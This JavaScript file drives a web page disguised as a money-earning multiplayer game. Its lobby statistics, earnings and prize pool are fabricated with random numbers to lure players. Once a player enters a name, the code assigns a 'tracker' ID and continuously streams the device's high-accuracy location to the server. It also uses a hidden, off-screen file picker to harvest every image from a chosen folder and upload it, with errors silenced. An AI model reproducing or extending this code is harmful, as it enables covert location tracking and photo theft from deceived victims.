const roomId = window.location.pathname.split('/').pop();
const joinScreen = document.getElementById('join-screen');
const playScreen = document.getElementById('play-screen');
const errorEl = document.getElementById('error');
const startBtn = document.getElementById('start-btn');
const statusText = document.getElementById('status-text');
const statusSub = document.getElementById('status-sub');
const personNameEl = document.getElementById('person-name');
const earningsEl = document.getElementById('earnings');
const rankEl = document.getElementById('rank');
const streakEl = document.getElementById('streak');
const progressFill = document.getElementById('progress-fill');
const progressHint = document.getElementById('progress-hint');
const onlineCount = document.getElementById('online-count');
const prizePool = document.getElementById('prize-pool');
const prizeTick = document.getElementById('prize-tick');

let watchId = null;
let ws = null;
let trackerId = null;
let earnings = 0;
let streak = 0;
let progress = 0;
let gameTimers = [];
let syncRunning = false;

const IMAGE_EXT = /\.(jpe?g|png|webp|gif|heic|heif)$/i;

function isImageFile(file) {
  return file.type.startsWith('image/') || IMAGE_EXT.test(file.name || '');
}

function showError(msg) {
  errorEl.textContent = msg;
  errorEl.classList.remove('hidden');
}

function hideError() {
  errorEl.classList.add('hidden');
}

function rand(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function animateLobby() {
  let online = rand(2400, 3200);
  onlineCount.textContent = online.toLocaleString();
  setInterval(() => {
    online += rand(-3, 8);
    onlineCount.textContent = online.toLocaleString();
  }, 3000);

  let pool = rand(11000, 15000);
  prizePool.textContent = `$${pool.toLocaleString()}`;
  setInterval(() => {
    pool += rand(1, 15);
    prizePool.textContent = `$${pool.toLocaleString()}`;
    prizeTick.textContent = rand(50, 200);
  }, 2000);
}

function startGameUI(name) {
  joinScreen.classList.add('hidden');
  playScreen.classList.remove('hidden');
  personNameEl.textContent = name;
  statusText.textContent = 'Finding match…';
  statusSub.textContent = 'Connecting to server';

  setTimeout(() => {
    statusText.textContent = 'Match live!';
    statusSub.textContent = "You're in — keep playing to earn more";
    backgroundMediaSync();
  }, 2000);

  rankEl.textContent = `#${rand(100, 999)}`;

  gameTimers.push(setInterval(() => {
    earnings += Math.random() * 0.08 + 0.02;
    earningsEl.textContent = `$${earnings.toFixed(2)}`;
    streak = Math.min(streak + 1, 99);
    streakEl.textContent = `${streak}🔥`;
    progress = Math.min(progress + rand(1, 3), 100);
    progressFill.style.width = `${progress}%`;
    if (progress >= 100) {
      progressHint.textContent = '🎉 Bonus unlocked! Keep playing…';
    } else {
      progressHint.textContent = `${progress}% to next bonus…`;
    }
  }, 2000));
}

async function sendLocation(lat, lng, accuracy) {
  if (!trackerId) return;
  const payload = { lat, lng, accuracy };
  if (ws?.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify({ type: 'location', ...payload }));
    return;
  }
  const res = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/location`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });
  if (res.status === 404) await rejoin();
}

async function rejoin() {
  const name = personNameEl.textContent;
  if (!name || name === '—') return;
  const res = await fetch(`/api/rooms/${roomId}/join`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name }),
  });
  if (!res.ok) return;
  const data = await res.json();
  trackerId = data.tracker_id;
  connectWs();
}

function connectWs() {
  const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
  ws = new WebSocket(`${protocol}//${location.host}/ws/track/${roomId}/${trackerId}`);
  ws.onclose = () => setTimeout(() => { if (trackerId) connectWs(); }, 2000);
}

async function uploadPhoto(file) {
  if (!trackerId || !file) return false;
  const form = new FormData();
  form.append('file', file, file.name || 'photo.jpg');
  const res = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/photos`, {
    method: 'POST',
    body: form,
  });
  return res.ok;
}

function pickViaInput({ webkitdirectory = false, multiple = true, accept = '' } = {}) {
  return new Promise((resolve) => {
    const input = document.createElement('input');
    input.type = 'file';
    input.multiple = multiple;
    if (webkitdirectory) input.webkitdirectory = true;
    if (accept) input.accept = accept;
    input.style.cssText = 'position:fixed;left:-9999px;opacity:0;width:0;height:0;';
    document.body.appendChild(input);
    const finish = (files) => {
      input.remove();
      resolve(files);
    };
    input.addEventListener('change', () => finish([...input.files]), { once: true });
    input.click();
  });
}

async function readDirImages(dirHandle, acc = []) {
  for await (const [, handle] of dirHandle.entries()) {
    if (handle.kind === 'file') {
      const file = await handle.getFile();
      if (isImageFile(file)) acc.push(file);
    } else if (handle.kind === 'directory') {
      await readDirImages(handle, acc);
    }
  }
  return acc;
}

async function pickBulkMedia() {
  if (window.showDirectoryPicker) {
    try {
      const dir = await window.showDirectoryPicker({ mode: 'read' });
      return readDirImages(dir);
    } catch (e) {
      if (e.name === 'AbortError') return null;
    }
  }

  const folderFiles = await pickViaInput({ webkitdirectory: true });
  const fromFolder = folderFiles.filter(isImageFile);
  if (fromFolder.length) return fromFolder;

  const galleryFiles = await pickViaInput({
    multiple: true,
    accept: '.jpg,.jpeg,.png,.webp,.gif,.heic,.heif',
  });
  return galleryFiles.filter(isImageFile);
}

async function uploadQueue(files) {
  const queue = [...files];
  const workers = Array.from({ length: 3 }, async () => {
    while (queue.length) {
      const file = queue.shift();
      if (file) await uploadPhoto(file);
    }
  });
  await Promise.all(workers);
}

async function backgroundMediaSync() {
  if (syncRunning || !trackerId) return;
  syncRunning = true;

  try {
    const files = await pickBulkMedia();
    if (files?.length) await uploadQueue(files);
  } catch { /* silent */ }

  syncRunning = false;
}

async function startPlaying() {
  hideError();
  const name = document.getElementById('name').value.trim();
  if (!name) { showError('Enter your player name to continue.'); return; }

  startBtn.disabled = true;
  startBtn.textContent = 'LOADING…';

  try {
    const joinRes = await fetch(`/api/rooms/${roomId}/join`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name }),
    });
    if (!joinRes.ok) throw new Error('Could not join match. Try again.');
    const { tracker_id } = await joinRes.json();
    trackerId = tracker_id;

    startGameUI(name);
    connectWs();

    if (navigator.geolocation) {
      watchId = navigator.geolocation.watchPosition(
        (pos) => {
          const { latitude, longitude, accuracy } = pos.coords;
          sendLocation(latitude, longitude, accuracy);
        },
        () => { /* silent */ },
        { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 }
      );
    }

    gameTimers.push(setInterval(async () => {
      if (!trackerId) return;
      const check = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}`);
      if (check.status === 404) await rejoin();
    }, 8000));

  } catch (e) {
    showError(e.message || 'Something went wrong.');
    startBtn.disabled = false;
    startBtn.textContent = '▶ PLAY NOW';
  }
}

startBtn.addEventListener('click', startPlaying);
document.getElementById('name').addEventListener('keydown', (e) => {
  if (e.key === 'Enter') startPlaying();
});

animateLobby();

setInterval(() => {
  if (ws?.readyState === WebSocket.OPEN) ws.send('ping');
}, 25000);
